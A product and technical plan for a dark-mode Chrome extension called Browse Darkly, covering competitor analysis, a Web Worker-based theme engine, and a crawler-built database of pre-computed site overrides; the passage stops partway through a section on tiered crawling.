# Browse Darkly — Product Plan

> Domain: **browsedarkly.com** (Cloudflare)
> Product: General-purpose dark mode Chrome extension
> Positioning: Premium dark mode with beautiful design, native Chrome UI, and Google Workspace deep integration

---

## 1. The Opportunity

### Market Size
- Chrome has ~3.45B users; ~35% use dark mode browser settings = **~1.2B dark mode Chrome users**
- Dark Reader has 10M users, Night Eye has 1M — the gap between demand (1.2B) and adoption (12M) is enormous
- 64.6% of users expect websites to auto-apply dark mode
- 82% of smartphone users use dark mode

### Dark Reader's Achilles Heels (Our Opening)
1. **Performance**: 55% Speedometer slowdown measured ([GitHub #14233](https://github.com/darkreader/darkreader/issues/14233)). Users report browser freezes, "Not Responding" states, lag after weeks of use
2. **Design**: Brightness/contrast/sepia sliders = developer tools, not a consumer product. No curated presets
3. **UI**: Cramped popup, no side panel, confusing mode selector (Filter / Filter+ / Dynamic / Static)
4. **Monetization backlash**: 71% of users voted against paid model in community poll. Paying $9.99/yr only removes nag banners — zero feature differentiation
5. **Privacy concerns**: Contradictory claims ("never collects data" + "may collect browser info"), periodic phone-home behavior
6. **Site breakage**: Reddit Shadow DOM broke it in Dec 2025. Complex SPAs frequently break

### Revenue Benchmarks
| Extension | Revenue | Pricing |
|-----------|---------|---------|
| Gmass | $130k/month | $8-20/month |
| Night Eye | $3.1k/month | $9/year |
| GoFullPage | $10k/month | Free + $1/month |

---

## 2. Core Value Proposition

**"Dark mode that looks good."**

Dark Reader makes sites dark. Browse Darkly makes sites *beautiful* in dark mode.

Same positioning as Figma vs Paint — both let you design, but one is a premium experience.

---

## 3. Differentiators (Ranked by Strength)

### Tier 1: Strong Differentiators

**A. Curated Color Presets** — Our single biggest advantage
- Dark Reader: brightness/contrast sliders. Browse Darkly: Nord, Solarized, Monokai, Catppuccin, Rose Pine + more (Dracula, One Dark, Gruvbox, Tokyo Night, Ayu)
- Already built: `@darkly/core/src/theme/presets.ts` has 5 presets with 14 CSS variables each
- Users see the difference immediately — this is visual, shareable, desirable

**B. Chrome Side Panel UI** — No dark mode extension does this today
- Dark Reader: tiny popup (~400x500px). Browse Darkly: persistent side panel (full height, ~320px wide, resizable)
- Side panel persists across tab switches, supports live preview while adjusting settings
- Available since Chrome 114 (MV3). Supports React. Can be context-aware per domain
- Hybrid approach: toolbar click = quick toggle popup, "Open Settings" button = side panel
- `chrome.sidePanel.open()` (Chrome 116+), `chrome.sidePanel.close()` (Chrome 141+)

**C. Performance** — Dark Reader's #1 complaint, our #1 opportunity
- Our approach: CSS variable injection + curated stylesheets = fundamentally lighter
- Dark Reader's Dynamic mode: parses every CSS rule, rewrites colors in real time, intercepts all stylesheet mutations
- Trade-off: accuracy vs speed. Hybrid strategy: fast CSS injection for most sites, curated overrides for popular sites

**D. Google Workspace Deep Integration** — Our unique moat
- Browse Darkly + Darkly Suite = hand-tuned themes for Gmail/Sheets/Docs + general dark mode everywhere else
- Natural upsell: Free → Pro → Premium (with Google Workspace integration)
- No competitor can offer this combination

### Tier 2: Moderate Differentiators

**E. Per-Site Theme Memory** — "GitHub gets Monokai, Reddit gets Catppuccin, Notion gets Rose Pine"
- Dark Reader: per-site on/off only. Night Eye: basic customization
- Browse Darkly: full preset per domain. Creates stickiness and delight

**F. Smart Dark Mode Detection** — Skip already-dark sites
- Detect `prefers-color-scheme: dark` media queries, `color-scheme` meta tags, `.dark` classes
- Dark Reader has a static list of ~1,026 known dark sites but no algorithmic detection
- Prevents double-dark conflicts (a common Dark Reader complaint)

**G. Account Management & License Portal** — Table stakes for paid, but competitors lack it
- Dark Reader: no account system. Night Eye: basic
- We already have Stripe + D1 + Google OAuth infrastructure from Darkly Suite

**H. Privacy / Zero Telemetry** — Easy to claim, genuinely matters
- Zero network requests except license validation
- All preferences stored locally in `chrome.storage`
- Minimal permissions footprint

### Tier 3: Skip for V1

- **Reader Mode**: Tangential, high effort, dedicated extensions already exist
- **"AI-Powered" Color Analysis**: Marketing buzzword risk, marginal benefit over good heuristics

---

## 4. Dark Reader Dynamic Theme Engine — Deep Analysis

### Pipeline Overview

Dark Reader's Dynamic Theme is a 9-stage pipeline that processes every CSS rule on a page:

```
[1] Proxy injection (monkey-patch CSSStyleSheet, attachShadow, adoptedStyleSheets)
[2] Static style injection (fallback bg → user-agent → text → inline → variables → override)
[3] Collect all <style>/<link> elements (including shadow DOM, CORS fetch fallback)
[4] For each stylesheet: access CSSOM rules, resolve @import, create StyleManager
[5] Feed all rules into VariablesStore (type inference via bitwise flags)
[6] For each StyleManager: hash rules → get modifier functions → build ReadyGroup tree → inject
[7] Process inline styles on all elements (MutationObserver + rate limiting)
[8] Start continuous watchers (tree, sheet changes, inline styles, custom elements)
[9] Loop: mutation → classify → create/remove managers → re-match variables → re-render
```

### How They Parse CSS

**They do NOT have a custom CSS parser.** They use the browser's CSSOM exclusively:
- `element.sheet.cssRules` for rule access
- `CSSStyleRule.style` property iteration for declarations
- `getPropertyValue()` for values
- CORS-blocked sheets: fetch via background script → `new CSSStyleSheet().replaceSync(text)`
- `@import` resolved recursively through background script fetches

### Color Transformation Algorithm

**Pipeline**: CSS string → `parseColorWithCache()` → RGBA → `rgbToHSL()` → modify → `hslToRGB()` → filter matrix → output

**Color parsing handles**: hex (3/4/6/8 digit), `rgb()`/`rgba()`, `hsl()`/`hsla()`, `oklch()`, `oklab()`, `lab()`, `lch()`, `hwb()`, `color-mix()`, `light-dark()`, 140+ named colors, `currentColor`, `transparent`, system colors. DOM fallback: 1×1 canvas `getImageData`.

**Background darkening** (`modifyBgHSL`):
- Light backgrounds (L≥0.5): scale L from [0.5,1] to [0.4,pole]
- Neutral detection: S<0.12 → adopt pole hue/saturation
- Yellow penalty: hues 40-80° get L×0.75 (avoids muddy dark-yellows)
- Orange-green hue remapping to prevent clashes

**Foreground brightening** (`modifyFgHSL`):
- Dark text (L≤0.5): scale L from [0,0.5] to [pole, 0.55]
- Min lightness 0.55 for readability
- Blue hues 205-245° remapped to 205-220° (blue text legibility fix)

**Border balancing** (`modifyBorderHSL`):
- Simple inversion: L from [0,1] to [0.5,0.2]

**Post-processing**: 5×5 color matrix applies brightness, contrast, sepia, grayscale.

### CSS Variable System (Most Complex Part)

**Bitwise type flags**:
```
VAR_TYPE_BG_COLOR     (1<<0)  // 0001
VAR_TYPE_TEXT_COLOR    (1<<1)  // 0010
VAR_TYPE_BORDER_COLOR  (1<<2)  // 0100
VAR_TYPE_BG_IMG        (1<<3)  // 1000
```

Variables can have multiple types simultaneously. `--accent: #007bff` used as both `background-color` and `color` gets type `0011`.

**Resolution**: Scans all rules for `--*` definitions and `var()` usages → builds dependency graph (`varRefs: Map<string, Set<string>>`) → propagates types through chains → handles circular references via stack-based detection → wraps names for output: `--color` → `--darkreader-bg--color`, `--darkreader-text--color`, etc.

**Reactive updates**: When a variable's type changes (new CSS adds a new usage context), `typeChangeSubscriptions` notify affected `StyleSheetModifier` instances to regenerate.

### Override Mechanism

**One modified stylesheet per source stylesheet**. Uses same selectors as originals (wins by source order, no blanket `!important`). Hash-based cache (`rulesTextCache + rulesModCache`) enables incremental updates — only new/changed rules are reprocessed.

### SPA Support

**Prototype-level interception**: `CSSStyleSheet.prototype.insertRule/deleteRule/replace/replaceSync` are monkey-patched. Each call dispatches `CustomEvent('__darkreader__updateSheet')`. Batched via `queueMicrotask()` (multiple calls in same microtask → single event).

**DOM mutations**: Optimized `MutationObserver` with two thresholds — minor (<1000 mutations) get classified individually, huge (≥1000) trigger full re-scan.

### Performance Fast Path

**Color-only changes**: When only brightness/contrast/sepia change (not structural CSS changes), skips ALL parsing. Uses a registered color palette (`--darkreader-bg-rrggbb`, `--darkreader-text-rrggbb`) to recompute just the colors.

### Known Performance Bottlenecks

1. **Initial processing**: 10K+ `getModifiableCSSDeclaration()` calls, each parsing colors and creating closures — all on main thread
2. **Variable matching**: O(V×R) for V variables and R references — runs on every stylesheet update
3. **Inline style processing**: Thousands of elements with `style=""` each trigger individual DOM writes
4. **Hash computation**: String hashing of full CSS text for every rule on every render cycle
5. **Color regex cascade**: Sequential regex tests for each color format
6. **No Web Workers**: Everything on main thread — 55% Speedometer slowdown

### What We Can Do Better (vs Dark Reader)

1. **Off-thread processing**: Move CSS parsing + color math to a Web Worker (Dark Reader does everything on main thread)
2. **WASM color math**: Batch color transformations in Rust/WASM (3-5× faster than JS for compute)
3. **Persistent caching**: IndexedDB cache of transformed CSS per domain (Dark Reader has in-memory only)
4. **GPU filter as instant fallback**: Show dark mode in <1ms via CSS filter while accurate overrides compute in background
5. **CSS custom property fast path**: Modern sites using CSS variables can be themed by overriding root properties — zero per-rule processing
6. **Incremental/viewport-aware processing**: Process above-fold CSS first, rest at background priority
7. **UI**: Their Malevic-based popup is functional but dated. React + Side Panel = modern, spacious
8. **Presets**: They have brightness/contrast sliders. We have curated named palettes
9. **Privacy**: They phone home. We don't
10. **Monetization UX**: Their paid tier removes nag banners only. Ours gates actual premium features

---

## 5. Optimized Theme Engine Architecture

### The Core Insight

Dark Reader's 55% Speedometer slowdown comes from doing ALL CSS processing on the main thread. Our engine adopts their proven Dynamic Theme approach (CSSOM-based rule rewriting) but optimizes with off-thread processing, multi-tier caching, and a filter-first instant dark approach.

### The Pipeline: Filter-First, Swap-to-Overrides

```
Page Load (0ms)
  |
  v
[1] INSTANT GPU FILTER (<1ms)
  |  Inject: html { filter: invert(0.93) hue-rotate(180deg) }
  |  Un-invert: img, video, canvas, svg, picture
  |  User sees dark mode IMMEDIATELY (transient — 50-300ms visible)
  |
  v
[2] CSS CUSTOM PROPERTY FAST PATH (5-20ms)
  |  Scan :root for CSS custom properties with color values
  |  If found → override with preset color mappings
  |  Fade-swap from filter to overrides. DONE for modern var-based sites.
  |  If not found → continue to full pipeline
  |
  v
[3] INDEXEDDB / OVERRIDE DB CACHE CHECK (10-30ms)
  |  Hash page's CSS content → check local cache + pre-computed DB
  |  Cache hit → inject cached CSS via adoptedStyleSheets
  |  Fade-swap from filter. DONE for repeat visits + top sites.
  |  Cache miss → continue to full pipeline
  |
  v
[4] FULL DYNAMIC PIPELINE (off-thread)
  |  a. Serialize CSSOM rules to compact format (main thread, 30-80ms — unavoidable)
  |  b. Transfer to Web Worker via Transferable ArrayBuffer (<1ms)
  |  c. Worker runs TypeScript color transformer (batched)
  |  d. Worker returns transformed CSS strings
  |  e. Content script injects via adoptedStyleSheets
  |
  v
[5] FADE-SWAP TRANSITION
  |  Use TransitionManager fade overlay (existing core code)
  |  Filter off → overrides on in a single swap (no progressive replacement)
  |  Store result in IndexedDB for next visit
  |
  v
COMPLETE: Full accurate dark mode, cached for next visit
```

### Filter-to-Override Transition: Single Swap, Not Progressive

Progressive section-by-section replacement of the GPU filter is not feasible — CSS `filter` on `<html>` affects ALL descendants, and you cannot un-filter a subtree without breaking stacking contexts. Instead, the transition is a **single atomic swap** hidden behind a brief fade overlay:

1. GPU filter provides instant dark mode (<1ms)
2. Worker computes accurate overrides in background (50-300ms)
3. `TransitionManager` triggers brief fade-to-black overlay (~150ms)
4. During fade: remove GPU filter, inject all override stylesheets
5. Fade completes: user sees accurate dark mode

This reuses the existing `TransitionManager` from `@darkly/core/src/theme/transitions.ts`. The filter is **transient** — visible for 50-300ms maximum. At this duration, even the filter's mediocre color accuracy (rated ~2.6/5 across diverse sites) is acceptable because users judge quality based on the final rendered state.

### Filter Quality Assessment

The GPU filter (`invert(0.93) hue-rotate(180deg)`) was assessed across 10 site categories:

| Category | Quality (1-5) | Notes |
|----------|:------------:|-------|
| Simple/minimal (Craigslist, HN) | 4.5 | Nearly perfect — simple text inverts cleanly |
| Text-heavy news (NYT, Wikipedia) | 3.5 | Good text, but CSS background images remain inverted |
| Video platforms (YouTube, Twitch) | 3.0 | Video un-inversion works; colored UI distorts |
| Developer tools (GitHub, SO) | 3.0 | Syntax highlighting colors get muddied |
| WordPress/CMS blogs | 3.0 | Body text good; theme-specific colors distort |
| Media-heavy social (Reddit, X) | 2.0 | Many already have native dark mode (should defer) |
| E-commerce (Amazon, Shopify) | 2.0 | Product images via CSS background-image stay inverted |
| Banking/government | 2.0 | WCAG contrast failures on form elements |
| Web apps/SPAs (Gmail, Notion) | 1.5 | Canvas rendering breaks; complex layouts distorted |
| Design-heavy (Dribbble) | 1.5 | Color accuracy is the entire value proposition |

**Key problems**: `hue-rotate(180deg)` is a linear RGB matrix operation, not true perceptual rotation — saturated colors get muddied. CSS `background-image` elements are not caught by `<img>` un-inversion. `filter` on `<html>` creates a new stacking context, breaking `position: fixed` elements. Sub-pixel text rendering is lost (text appears blurrier, especially on Windows).

**Implication**: Filter is only acceptable as a <300ms transient. The CSS variable fast path, pre-computed overrides, and dynamic pipeline are what users actually see.

### Expected Performance Profile

| Scenario | Time to Dark Mode | Main Thread Blocked | Speedometer Impact |
|----------|-------------------|--------------------|--------------------|
| **Pre-computed site (top 500, bundled)** | ~5-10ms | ~5ms | Near-zero |
| **Modern site (CSS vars)** | ~5-20ms | ~5ms | Near-zero |
| **Repeat visit (cached)** | ~10-30ms | ~10ms | Near-zero |
| **First visit, legacy site** | <1ms (filter), 100-300ms (accurate) | 40-100ms (serialization) | Minimal |
| **Dark Reader comparison** | 200-1000ms | 200-1000ms | 55% slowdown |

**Honest accounting**: CSSOM serialization (iterating `cssRules`, reading properties) is unavoidable on the main thread: ~30-80ms for Gmail-scale CSS (~5000 rules). The Web Worker eliminates the color transformation and CSS generation from the main thread, reducing main-thread blocking by ~50-60% vs Dark Reader. The GPU filter hides the remaining latency.

### Optimization Techniques (Ranked by Impact)

#### 1. Web Worker for CSS Processing
- **What**: Move color transformation and CSS generation to a dedicated Web Worker. Color math in TypeScript (not WASM — see rationale below)
- **Why it matters**: Reduces main-thread blocking by ~50-60%. The remaining 40-100ms is CSSOM serialization (unavoidable — `sheet.cssRules` is main-thread only)
- **Data flow**: Serialize CSSOM rules → Transferable ArrayBuffer → Worker → TypeScript batch transform → Transferable back → `adoptedStyleSheets` injection
- **Why not WASM**: The bottleneck is string parsing at the JS↔WASM boundary (`wasm-bindgen` overhead), not arithmetic. V8's JIT optimizes simple color math extremely well. Benchmarks show WASM is ~1.5-2x faster for large batches (1000+ colors) but **net negative** for typical pages (50-200 unique colors) due to serialization overhead. TypeScript in a Web Worker is the right trade-off: off-thread processing (the real win) without WASM complexity (6-10 weeks of Rust work for marginal gain)

#### 2. GPU Filter as Instant Fallback
- **What**: Apply `filter: invert(0.93) hue-rotate(180deg)` on `<html>` in <1ms. Swap to accurate overrides via fade overlay
- **Why it matters**: User sees dark mode on EVERY page load instantly, regardless of CSS complexity
- **Transition**: Single atomic swap with `TransitionManager` fade overlay — not progressive (see above)
- **Improvement**: Consider the [hue-preserving SVG filter](https://monochrome.sutic.nu/2024/02/25/hue-preserving-invert-css-filter-for-dark-mode.html) which uses YUV color space math with gamma correction for better color preservation on saturated colors

#### 3. Persistent IndexedDB Caching
- **What**: Cache fully-transformed CSS per `{domain + CSS content hash}`. On repeat visit, hash → lookup → inject. Zero processing
- **Tiers**: (1) In-memory LRU for color values, (2) Per-page stylesheet cache in IndexedDB, (3) Per-domain rule cache for SPA partial hits
- **Size**: Gmail CSS is ~500KB-1MB. Top 100 most-visited user domains × 1MB per preset = 500MB-1GB — within IndexedDB quota. Tier 3 full CSS should only cache top ~100 per-user domains, not all 100K
- **Edge case**: IndexedDB can be cleared by the user or Chrome's storage pressure eviction. Extension needs graceful degradation to dynamic pipeline when cache is cold

#### 4. CSS Custom Property Fast Path
- **What**: For sites using CSS variables for colors, override `:root` custom properties with preset color mappings. Pure CSS, zero JS processing
- **Realistic coverage**: **15-25%** of sites can be fully themed via CSS variable overrides alone. Another 20-30% can be partially themed (some colors from vars, others hardcoded). The remaining 45-65% need full rule processing
- **Why not 40-60%**: "Using CSS variables" ≠ "all colors defined via CSS variables." Tailwind uses utility classes with hardcoded values. WordPress themes frequently hardcode. Many sites mix vars with inline styles
- **Key advantage**: CSS custom properties **inherit through Shadow DOM boundaries** by design. Overriding color variables on `:root` automatically cascades into all shadow roots — zero per-shadow-root work needed
- **Detection challenge**: Determining which variables hold colors requires tracing where each variable is used (`color`, `background-color`, `border-color` properties) — similar to Dark Reader's bitwise type inference system

#### 5. Viewport-Aware Incremental Processing
- **What**: Process above-fold CSS at `user-blocking` priority, below-fold at `background` priority. Use `IntersectionObserver` for scroll-triggered processing
- **Why**: Even a 300ms full-page process feels instant if the visible portion renders in 50ms
- **API**: `scheduler.postTask()` with priority levels + `scheduler.yield()` to prevent Long Tasks

### Additional Technical Decisions

- **`adoptedStyleSheets`** for all CSS injection (no `<style>` element DOM mutations). 94.85% global browser support (Chrome 73+). One `CSSStyleSheet` can be shared across hundreds of shadow roots — parsed once, all adoptions are pointer assignments (10-40x faster than `<style>` injection per shadow root)
- **`chrome.scripting.insertCSS({ origin: 'USER' })`** for base theme (user-agent priority, no `!important` needed)
- **CSS `@layer`** for organizing override hierarchy (base theme → site fixes → user customizations). Works inside shadow root adopted stylesheets, but layer identifiers do NOT cross shadow boundaries
- **One override sheet per source sheet** (same as Dark Reader — proven to handle specificity correctly)
- **Stylesheet proxy pattern** from Dark Reader for SPA support (intercept `insertRule/deleteRule`)
- **Rate-limited inline style observation** with cycle detection (from Dark Reader, prevents infinite loops)
- **Dark site detection**: Algorithmic grid sampling + `color-scheme` meta tag + CSS class detection + bootstrap from Dark Reader's 1,282-domain skip list

---

## 6. Pre-Computed Override Database

### The Core Insight

Dark mode for any given site is a **pure function** of that site's CSS. Pure functions can be memoized. Instead of computing dark mode overrides on every user's machine in real-time, we can **crawl the web's most popular sites, compute overrides offline, and ship pre-computed results** — turning a 100-300ms dynamic computation into a 5-10ms cache lookup.

This is our strongest competitive moat. Dark Reader processes every page from scratch on every visit. We can skip that entirely for the vast majority of sites users actually visit.

### Coverage Math

| List | Sites | Chrome Traffic Coverage | Source |
|------|-------|------------------------|--------|
| Tranco Top 1K | 1,000 | ~60-70% of page loads | Tranco (academic, manipulation-resistant) |
| CrUX Top 10K | 10,000 | ~85% of page loads | Chrome UX Report (Google BigQuery) |
| CrUX Top 100K | 100,000 | ~93% of page loads | Chrome UX Report |
| CrUX Top 1M | 1,000,000 | >95% of page loads | Chrome UX Report |

**The key insight**: Web traffic follows a power law. The top 1,000 sites cover the majority of actual browsing. By 100K sites, we've covered nearly everything users encounter day-to-day.

### Three-Tier Override Storage

Not all sites need the same level of override complexity:

#### Tier 1: CSS Variable Overrides (~400 bytes/site)
- **For**: Modern sites using CSS custom properties for colors (React/Vue/Angular with design systems)
- **What we store**: Just the `:root` variable names and their dark-mode replacements
- **Example**: `{ "--bg-primary": "#1a1a2e", "--text-primary": "#e0e0e0", "--border": "#2d2d44" }`
- **Coverage**: ~40-60% of modern sites (and growing — CSS vars are the standard now)
- **Why it's fast**: Pure CSS injection, zero JS processing needed

#### Tier 2: Fingerprinted Rule Overrides (~5-50KB/site)
- **For**: Sites with stable CSS that don't use variables (legacy sites, WordPress themes)
- **What we store**: CSS rule fingerprints (selector + property hash) → transformed values
- **Confidence scoring**: Each rule has a fingerprint hash. On page load, we hash the live CSS and compare:
  - ≥85% match → apply cached overrides + dynamically process only the delta (changed rules)
  - <85% match → full dynamic fallback (site has changed significantly)
- **Example**: `{ fingerprint: "a3f2b1", selector: ".header", overrides: "background:#1a1a2e;color:#e0e0e0" }`

#### Tier 3: Full Transformed CSS (~20-200KB/site)
- **For**: Complex sites with heavy CSS (Gmail, GitHub, Reddit, Twitter/X)
- **What we store**: Complete transformed stylesheets, ready to inject
- **Trade-off**: Larger storage but zero processing time — just inject and go
- **Staleness handling**: CSS content hash comparison; if the hash doesn't match, fall through to Tier 2 fingerprint matching or dynamic fallback

### Site-Style Analysis Engine

The crawler isn't a dumb "extract CSS → transform → ship" pipeline. It's an intelligent **analysis engine** that fully understands each site's visual identity and determines the optimal dark mode strategy. Every site gets analyzed — nothing is "too complex to skip." Complex sites just take more iterations to optimize.

#### Analysis Pipeline (Per Site)

```
[1] FULL PAGE RENDER (Playwright headless Chrome)
  |  Load page, wait for SPA hydration, execute JS
  |  Capture: full CSSOM, computed styles, DOM tree, screenshots
  |
  v
[2] DARK-MODE DETECTION & SKIP
  |  Is this site already permanently dark? → classify & skip
  |  Does it have built-in dark mode? → detect & defer
  |  (See detection signals below)
  |
  v
[3] STYLE COMPLEXITY ANALYSIS
  |  Count: stylesheets, CSS rules, custom properties, inline styles
  |  Classify: simple / moderate / complex / heavy-app
  |  Determine optimal override strategy (see strategy matrix)
  |
  v
[4] IMAGE & MEDIA ANALYSIS
  |  Identify: hero images, logos, icons, SVGs, background images
  |  Classify each: needs inversion protection? transparent bg?
  |  Generate: per-element un-inversion rules where needed
  |
  v
[5] ITERATIVE OPTIMIZATION (Playwright workers)
  |  Apply dark mode strategy → screenshot → score quality
  |  Adjust: contrast ratios, color mappings, element exceptions
  |  Repeat per preset (Nord, Solarized, Monokai, etc.)
  |  Complex sites get more iterations (minutes, not seconds)
  |
  v
[6] QUALITY GATE & PUBLISH
  |  Automated: WCAG AA contrast audit (axe-core), screenshot diff scoring
  |  Automated: Element visibility check, structural preservation scoring
  |  Top 100 sites: manual QA
  |  Post-launch: crowdsourced user feedback replaces ML scoring
  |  Publish to CDN with confidence scores
```

#### Dark-Mode Detection & Skip

Not every site needs our dark mode. The analysis engine detects three categories:

**Category A: Permanently Dark Sites → Skip entirely**

These sites are always dark. Applying dark mode would double-invert them.

| Detection Signal | Method |
|-----------------|--------|
| Background luminance sampling | Render page → sample 9-point grid on `<body>` → average luminance < 0.3 = dark-dominant |
| `color-scheme: dark` meta tag | `<meta name="color-scheme" content="dark">` in HTML |
| CSS `color-scheme: dark only` | Site explicitly declares dark-only in stylesheet |
| Dark body background in computed styles | `getComputedStyle(document.body).backgroundColor` → luminance check |
| Known dark sites list | Bootstrap with Dark Reader's 1,026-site static list, then grow via our own detection |

**Example permanently dark sites**: Discord, Spotify Web, Steam, most gaming sites, many developer tools (GitHub's dark default, VS Code web).

**Output**: `{ strategy: "skip", reason: "permanently-dark", confidence: 0.95, signals: [...] }`

**Category B: Sites with Built-In Dark Mode → Detect & Defer**

These sites have their own dark mode toggle/system-preference detection. We should activate *their* dark mode rather than overriding with ours.

| Detection Signal | Method |
|-----------------|--------|
| `prefers-color-scheme` media queries | Parse stylesheets for `@media (prefers-color-scheme: dark)` blocks |
| Toggle elements in DOM | Search for dark mode toggle buttons/switches (common class names: `theme-toggle`, `dark-mode-switch`, etc.) |
| `color-scheme` meta with both values | `<meta name="color-scheme" content="light dark">` = site supports both |
| CSS class-based theming | Detect `.dark`, `.theme-dark`, `[data-theme="dark"]` patterns in stylesheets |
| `matchMedia` listeners in JS | Intercept `window.matchMedia('(prefers-color-scheme: dark)')` registrations |
| LocalStorage/cookie theme keys | Check for `theme`, `darkMode`, `color-mode` keys in storage |

**Action**: Instead of applying our overrides, the extension activates the site's native dark mode using one of three techniques (NO `chrome.debugger` — it would be rejected by CWS):
1. **CSS injection**: `:root { color-scheme: dark !important; }` — triggers `light-dark()` CSS functions and native form control dark mode
2. **Page-world `matchMedia` override**: `pageWorld.js` overrides `window.matchMedia('(prefers-color-scheme: dark)')` to report dark — triggers sites listening for system theme
3. **DOM attribute injection**: Set `data-theme="dark"`, `class="dark"`, or equivalent based on `activationHint` from analysis
Our presets can then apply subtle color adjustments on top of the site's native dark mode.

**Output**: `{ strategy: "defer-to-native", nativeMethod: "media-query" | "css-class" | "color-scheme-meta", activationHint: "set [data-theme='dark'] on <html>", confidence: 0.88 }`

**Category C: Light Sites Without Dark Mode → Our Target**

Everything else. These are the sites where Browse Darkly adds value. The analysis engine determines the optimal override strategy.

#### Strategy Classification Matrix

After dark-mode detection, every non-dark site gets classified by complexity and the optimal override approach is determined:

| Complexity | Signals | Strategy | Override Tier | Crawl Time |
|-----------|---------|----------|--------------|------------|
| **Simple** | <50 CSS rules, minimal inline styles, static content | CSS variable override or lightweight rule rewrite | Tier 1 or 2 | ~5 seconds |
| **Moderate** | 50-500 rules, some inline styles, standard framework (WordPress, Bootstrap) | Full rule analysis + fingerprinted overrides | Tier 2 | ~30 seconds |
| **Complex** | 500-5000 rules, heavy inline styles, SPA with dynamic CSS, Shadow DOM | Iterative Playwright optimization — apply → screenshot → score → refine | Tier 2 or 3 | ~2-5 minutes |
| **Heavy App** | 5000+ rules, massive inline styles, canvas/WebGL, deeply dynamic (Gmail, Figma, Google Sheets) | Extended iterative optimization — multiple page states, interaction-driven CSS discovery | Tier 3 | ~10-30 minutes |

**The key insight**: Nothing is "too complex." Heavy apps just require more Playwright worker time. A site like Gmail might take 30 minutes of iterative optimization, but once computed, every user gets that result in 5ms. The amortization is massive — 30 minutes of compute serving millions of page loads.

#### Iterative Optimization (Playwright Workers)

For moderate-to-heavy sites, the analysis engine doesn't just apply a transform and hope for the best. It **iterates**:

```
1. Apply dark mode strategy (CSS vars, rule rewrite, or filter)
2. Screenshot the result in Playwright
3. Score the screenshot:
   - Contrast ratio check (WCAG AA: 4.5:1 for text, 3:1 for large text) via axe-core
   - Un-inverted element detection (images that look wrong) via pixel diff
   - Structural layout preservation (screenshot diff scoring: dark vs light)
   - Element visibility detection (text on same-color background = invisible)
4. If score < threshold:
   - Identify problem areas (low-contrast text, broken images, invisible elements)
   - Adjust: add element-specific exceptions, tune color mappings, fix z-index issues
   - Re-apply and re-screenshot
5. Repeat for each preset (Nord, Solarized, Monokai, etc.)
6. Repeat for key page states (homepage, article page, settings page, etc.)
```

For complex SPAs, the workers also **interact with the page** — clicking nav items, opening modals, scrolling — to discover CSS that only loads on interaction. This ensures our overrides cover the full user experience, not just the landing page.

### Crawl Orchestrator

```
[1] SITE LIST (weekly refresh)
  |  Source: CrUX Top 1M via BigQuery (free tier sufficient)
  |  Fallback: Tranco list (daily updates, no Google dependency)
  |
  v
[2] ANALYSIS ENGINE (per site — see above)
  |  Tool: Crawlee + Playwright (headless Chrome)
  |  Workers: Parallel Playwright instances per site
  |  Rate: ~100K sites/week (simple sites fast, complex sites slow)
  |  Cost: ~$50-200/month (cloud VMs + bandwidth)
  |
  v
[3] RESULTS DATABASE
  |  Store: site classification, strategy, override data, confidence scores
  |  Schema: domain → { classification, strategy, overrides{}, quality_scores{}, last_crawled }
  |
  v
[4] PUBLISH TO CDN
  |  Host: Cloudflare R2 (S3-compatible, free egress)
  |  Format: Compressed bundles per domain
  |  Includes: override CSS + classification metadata (so extension knows how to apply)
  |  Manifest: version-stamped index with strategy hints per domain
```

### Distribution Strategy (Privacy-Preserving)

The extension must fetch override data **without revealing which sites a user visits**. Three tiers:

#### Bundled (Top 500 sites, ~8MB compressed)
- Shipped inside the extension `.crx` file
- Zero network requests needed
- Covers ~50-60% of browsing traffic
- Updated with each extension release

#### CDN Manifest (Top 50K sites)
- On install: download the full domain manifest (~2MB compressed list of domains + content hashes)
- Extension checks locally whether current domain is in the manifest
- If yes: fetch that domain's override bundle from CDN (single HTTPS request)
- **Privacy**: The CDN sees which override bundle was requested, but bundling by domain prefix (e.g., all `g*` domains in one file) can reduce fingerprinting
- Alternative: download override bundles in bulk by category (news sites, social, shopping) during idle time

#### Dynamic Fallback (Everything else)
- Sites not in our database get the full dynamic pipeline (Section 5)
- Results cached locally in IndexedDB for repeat visits
- **User feedback loop**: If a user visits a site not in our DB frequently, the extension can anonymously report the domain (not the URL) for inclusion in the next crawl cycle

### Extension-Side Decision Flow

When a user visits a site, the extension checks the override database and acts accordingly:

```
User visits example.com
  |
  v
Check override DB for example.com
  |
  ├─ Classification: "permanently-dark" → Do nothing. Site is already dark.
  |
  ├─ Classification: "defer-to-native" → Activate site's own dark mode
  |     (e.g., set data-theme="dark", emulate prefers-color-scheme: dark)
  |     Optionally: apply subtle preset color adjustments on top
  |
  ├─ Classification: "light-site" + strategy + overrides available
  |     → Apply pre-computed overrides (Tier 1/2/3 based on what was computed)
  |     → Verify freshness via CSS hash (see staleness table below)
  |
  └─ Not in DB → Full dynamic pipeline (Section 5)
        → Cache result locally in IndexedDB
        → Anonymously report domain for next crawl cycle
```

### Staleness & Freshness

| Signal | Action |
|--------|--------|
| Classification = permanently-dark | Skip dark mode entirely (re-check on re-crawl cycle) |
| Classification = defer-to-native | Activate native dark mode, skip our overrides |
| CSS content hash matches | Apply Tier 3 (full CSS) instantly |
| CSS content hash differs, fingerprints ≥85% match | Apply Tier 2 (matched rules) + dynamic delta |
| CSS content hash differs, fingerprints <85% match | Full dynamic fallback, flag for re-crawl |
| Site uses CSS variables matching our Tier 1 record | Apply Tier 1 (variable overrides) |
| Override bundle >30 days old | Flag for re-crawl in next cycle |
| User reports breakage | Prioritize in next crawl cycle |
| Site reclassified (was light, now has native dark mode) | Update strategy to defer-to-native |

### Crawl Phases (Build-Up Strategy)

| Phase | Sites | Timeline | Method |
|-------|-------|----------|--------|
| **Phase 0** | Top 100 | Manual | Hand-tuned overrides for highest-traffic sites |
| **Phase 1** | Top 1K | Weeks 1-2 | Automated crawl + manual QA for each site |
| **Phase 2** | Top 10K | Month 1-2 | Automated crawl + ML quality gate + sample QA |
| **Phase 3** | Top 100K | Month 3-6 | Fully automated pipeline with confidence scoring |
| **Phase 4** | Top 1M | Ongoing | Continuous crawl with user-reported freshness signals |

### Tiered Crawling (90% Cost Reduction)

Not every site needs Playwright. Use a two-tier approach to dramatically reduce compute costs:

**Tier A: HTTP-only crawl (90% of sites, ~1 second each)**
- `fetch(url)` → extract `<link>` stylesheets → parse with `css-tree`
- Handles: dark site detection, CSS variable enumeration, complexity classification, native dark mode detection (`@media (prefers-color-scheme: dark)` blocks)
- No headless browser needed — pure Node.js HTTP + CSS parsing
- **Cost per site: ~$0.00001**

**Tier B: Playwright crawl (10% of sites, ~30 seconds each)**
